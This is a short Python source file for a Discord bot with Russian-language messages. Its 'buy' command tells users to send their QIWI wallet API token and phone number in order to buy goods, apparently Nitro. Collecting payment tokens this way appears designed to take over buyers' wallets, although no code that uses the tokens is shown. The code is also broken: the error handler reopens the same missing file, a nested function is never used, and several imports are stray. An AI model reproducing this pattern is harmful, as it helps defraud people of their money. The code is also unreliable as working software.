from ast import Await
from dis import disco
from turtle import title
import discord
from discord.ext import commands
from discord.ext.commands import has_permissions, MissingPermissions
from Cybernator import Paginator as pag
import asyncio
from SimpleQIWI import *





try:
    with open('token.txt', 'r') as f:
        token=f.read()
except:
    with open('token.txt', 'r') as f:
        print('Введите токен в файл token.txt')
        input()
else:
    print('Подключено')




adms = [706378708000178177]
prefix = 'q?'





bot = commands.Bot(command_prefix=prefix)

@bot.event
async def on_ready():
    print("Запуск!")
    await bot.change_presence(activity=discord.Streaming(name=f'{prefix}help', url='https://www.youtube.com/watch?v=5qap5aO4i9A'))


@bot.remove_command('help')
@bot.command()
async def buy(ctx):
    embed=discord.Embed(
        title='Покупка товаров:',
        description='Для покупки введите QIWI TOKEN и ВАШ НОМЕР КИВИ (Без "+")'
    )
    await ctx.reply(embed=embed)
    async def nitro(ctx, token, nom):
        if len(nom)>9:
            await ctx.send('Номер не подходит!')

bot.run(token)